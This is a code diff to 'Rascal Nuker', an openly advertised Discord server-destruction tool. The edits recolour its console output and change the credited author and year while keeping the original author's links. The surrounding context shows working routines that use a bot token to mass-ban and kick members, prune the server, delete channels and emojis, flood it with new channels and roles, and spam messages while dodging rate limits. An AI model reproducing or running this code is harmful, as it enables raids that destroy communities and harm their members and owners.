@@ -78,7 +78,7 @@ class Rascal:
         while True:
             response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
             if response.status_code in [200, 201, 204]:
-                print("{}({}+{}) Banned {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;9m", member))
+                print("{}({}+{}) Banned {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;34m", member))
                 self.banned.append(member)
                 break
             elif "retry_after" in response.text:
@@ -101,7 +101,7 @@ class Rascal:
         while True:
             response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"})
             if response.status_code in [200, 201, 204]:
-                print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;9m", member))
+                print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;34m", member))
                 self.kicked.append(member)
                 break
             elif "retry_after" in response.text:
@@ -124,7 +124,7 @@ class Rascal:
         }
         response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
         if response.status_code == 200:
-            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;9m", response.json()['pruned'], "\x1b[0m"))
+            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;34m", response.json()['pruned'], "\x1b[0m"))
         elif "Max number of prune requests has been reached. Try again later" in response.text:
             print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", response.json()['retry_after']))
         elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
@@ -143,7 +143,7 @@ class Rascal:
         while True:
             response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
             if response.status_code == 201:
-                print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;9m", channelsname))
+                print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;34m", channelsname))
                 self.channels.append(1)
                 break
             elif "retry_after" in response.text:
@@ -169,7 +169,7 @@ class Rascal:
         while True:
             response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
             if response.status_code == 200:
-                print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;9m", rolesname))
+                print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;34m", rolesname))
                 self.roles.append(1)
                 break
             elif "retry_after" in response.text:
@@ -190,7 +190,7 @@ class Rascal:
         while True:
             response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
             if response.status_code == 200:
-                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;9m", channel))
+                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;34m", channel))
                 self.channels.append(channel)
                 break
             elif "retry_after" in response.text:
@@ -231,7 +231,7 @@ class Rascal:
         while True:
             response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
             if response.status_code == 204:
-                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;9m", emoji))
+                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;34m", emoji))
                 self.emojis.append(emoji)
                 break
             elif "retry_after" in response.text:
@@ -252,7 +252,7 @@ class Rascal:
         while True:
             response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
             if response.status_code == 200:
-                print("{}({}+{}) Spammed {}{}{} in {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;9m", content, "\x1b[0m", "\x1b[38;5;9m", channel))
+                print("{}({}+{}) Spammed {}{}{} in {}{}".format("\x1b[0m", "\x1b[38;5;9m", "\x1b[0m", "\x1b[38;5;34m", content, "\x1b[0m", "\x1b[38;5;9m", channel))
                 self.messages.append(channel)
                 break
             elif "retry_after" in response.text:
@@ -424,7 +424,7 @@ class Rascal:
     
         
         elif ans == "11":
-            print("- Rascal Nuker is a open sourced nuker which has been developed with heart by speezy. My goal was to make a great 2022's working nuker and to compete with actuals viral discord nukers.\n- You can follow me here\n- Github: https://github.com/notspeezy/\n- Cord: sp#5084\n- Insta: https://www.instagram.com/hzmicid/\n- Tiktok: speezy\n- Telegram: @notspeezy\n- YouTube: https://www.youtube.com/c/speezyw\n- Press any key to return.")
+            print("- Rascal Nuker is a open sourced nuker which has been developed with heart by Warrior. My goal was to make a great 2024's working nuker and to compete with actuals viral discord nukers.\n- You can follow me here\n- Github: https://github.com/notspeezy/\n- Cord: sp#5084\n- Insta: https://www.instagram.com/hzmicid/\n- Tiktok: speezy\n- Telegram: @notspeezy\n- YouTube: https://www.youtube.com/c/speezyw\n- Press any key to return.")
             input("")
             self.menu()
         
